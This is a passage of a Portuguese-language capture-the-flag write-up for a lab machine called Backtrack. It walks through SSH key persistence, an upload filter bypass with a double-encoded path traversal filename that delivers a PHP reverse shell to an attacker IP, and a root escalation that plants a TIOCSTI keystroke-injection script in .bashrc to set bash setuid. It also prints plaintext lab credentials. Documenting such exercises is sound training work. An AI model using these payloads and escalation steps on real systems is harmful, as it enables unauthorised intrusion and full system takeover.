wilbur@Backtrack:~/.ssh$ chmod 600 id_rsa
chmod 600 id_rsa
wilbur@Backtrack:~/.ssh$ cat id_rsa.pub >> authorized_keys
cat id_rsa.pub >> authorized_keys

```

> [!Lembrando...]
> A chave privada do `wilbur (id_rsa)` foi copiada para a máquina do atacante e atribuída a permissão 600 também
> Caso você precise criar o `authorized_keys` atribua a permissão 600


#### Analisando os arquivos e diretórios

![](attachment/06f6277ae8b1da821bbbefd343700575.png)

> [!Mais Credenciais]
> wilbur:mYe317Tb9qTNrWFND7KF
> 
> email : orville@backtrack.thm
> password : W34r3B3773r73nP3x3l$

Então o `orville` fala de uma aplicação WEB que está rodando localmente

![](attachment/4813f08716d706788ba2937e025512f2.png)

Então foi criado um túnel para poder acessar essa aplicação

`ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -f -N -D 1080 wilbur@10.10.251.85 -i id_rsa`

#### Galeria do `Orville`

Feito o tunelamento é obtido o acesso a plataforma Web, anteriormente, mencionada
![](attachment/e435d5ed49d1fb17ade48802d7ad70bc.png)

Foi acessando a página de Login > Usando a credenciais obtidas

Então foi deparado com uma "Galeria"de fotos. 

Houve uma tentativa de hospedar uma `shell.php` e deparamos com esse filtro que, provavelmente, está rodando no back-end

![](attachment/570f9a3dec1e68bc90418589e5e9d9a8.png)

Foi encontrado outra pasta `/includes` que a primeira vista foi interessante devido o arquivo que continha nela `db.php`, mas não consegui fazer nada.

Porém uma coisa foi percebida
`/includes`-> o arquivo  `db.php` conseguia ser executado , mas não tinha resposta.
`/uploads` -> Onde fica salva os `uploads` feito, mas não consigo executar. Foi feito uma análise até encontrarmos no `etc/apache2/apache2.conf` (através da shell via ssh do usuário `wilbur`). Com isso seria impossível executar algum arquivo `.php` naquela pasta.
```
<Directory /var/www/html/uploads>
        php_flag engine off
        AddType application/octet-stream php php3 php4 php5 phtml phps phar phpt
</Directory>
```

Então o caminho a ser escolhido é tentar um `path transversal` no arquivo a ser upado

`../../shell.jpg.php` -> Não funcionou e várias variantes

Porém foi feito uma tentativa para "encodar" a string completa e enviar a reverse shell

![](attachment/7f6d42913f761f8e5fb5c8a2e6f408e8.png)

Antes de fazer a requisição da payload, foi executado o `nc` para listener a conexão

```
------WebKitFormBoundaryqKKD0JRzQqHfyRBf
Content-Disposition: form-data; name="image"; filename="%252E%252E%252Fcom.png.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.13.72.32';
$port = 9898;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
.
.
.
```

![](attachment/b91b3e02347fb1b439097ca5c022a5ee.png)

### Usuário `Orville`

> [!Persistência]
> A primeira coisa que foi feita ao pegar shell do usuário foi persistir através da criação da chave SSH
#### Analisando o `db.php`
Como anteriormente foi visto que tem um arquivo chamado `db.php`
![](attachment/61e187566ac336324d68ca7fe02d298f.png)

> [!Credenciais do Banco de Dados]
> host = 'localhost';
> dbname = 'backtrack';
> username = 'orville';
> password = '3uK32VD7YRtVHsrehoA3';

Então com essas credenciais, o acesso ao banco é obtido e ao analisar as poucas tabelas que tem foi encontrado essas credenciais.

![](attachment/63532fee5290ae04e468dc245f464ea4.png)

> [!Credencial do Orville Criptografada]
> orville | orville@backtrack.thm | `$2y$10$dMzyvDTFnUPr.os1ZdWt1.oM4mUeZvH3OtcgJrww/QrD3o1Eb9XNW`

**Mas essas credenciais não é tão importante, até porque, foi obtida pelo usuário `wilbur` essa informação descriptografada.**

#### Analisando os arquivos do `/home/orville`

Partindo para a pasta do usuário foi encontrado a `flag` e um outro arquivo interessante 

![](attachment/b5532cdad67b605b5fcef4d324bf2e44.png)
Com isso foi feita uma análise fria do `web_snapshot.zip` para podermos coletar mais informações, porém não foi encontrado nada de mais.

### Escalando para R00T

Executando um binário chamado `pspy64` ele analisa os processos em tempo real sem ter que root

![](attachment/7c00b7c237e4e074dfa24f814dee739e.png)


Com isso é percebido que o usuário root executa uma série de comandos e depois altera para o usuário `orville`

Primeiro é feito o exploit.py
```
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

Agora é necessário colocar esse exploit dentro do bashrc para quando o usuário `orville`for chamada o exploit começar rodar
`echo 'python3 /home/orville/exploit.py' >> /home/orville/.bashrc`

Agora ao executar o `bash -p` terá acesso ao root

![](attachment/27feffb00b8510192babf21350c429c2.png)
